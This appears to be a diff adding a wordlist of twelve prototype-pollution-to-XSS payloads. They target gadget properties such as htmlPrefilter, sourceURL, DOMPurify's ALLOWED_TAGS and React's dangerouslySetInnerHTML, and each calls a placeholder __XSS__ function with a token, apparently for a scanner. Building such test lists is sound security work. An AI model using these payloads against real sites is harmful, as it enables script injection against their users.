@@ -1,0 +1,14 @@
+[
+  "__proto__[htmlPrefilter]=<img src=x onerror=__XSS__('{{TOKEN}}')>",
+  "__proto__[sourceURL]=\\n__XSS__('{{TOKEN}}');//",
+  "__proto__[customScripts]=javascript:__XSS__('{{TOKEN}}')",
+  "__proto__[ALLOWED_TAGS][]=script&__proto__[ALLOWED_ATTR][]=onload",
+  "__proto__[src]=data:text/javascript,__XSS__('{{TOKEN}}')",
+  "{\"__proto__\":{\"type\":\"script\",\"props\":{\"dangerouslySetInnerHTML\":{\"__html\":\"__XSS__('{{TOKEN}}')\"}}}}",
+  "__proto__[url]=javascript:__XSS__('{{TOKEN}}')",
+  "__proto__[transportUrl]=javascript:__XSS__('{{TOKEN}}')",
+  "__proto__[template]=<img src=x onerror=__XSS__('{{TOKEN}}')>",
+  "__proto__[inner]=<svg onload=__XSS__('{{TOKEN}}')>",
+  "constructor[prototype][htmlPrefilter]=<img src=x onerror=__XSS__('{{TOKEN}}')>",
+  "constructor[prototype][sourceURL]=\\n__XSS__('{{TOKEN}}');//"
+]
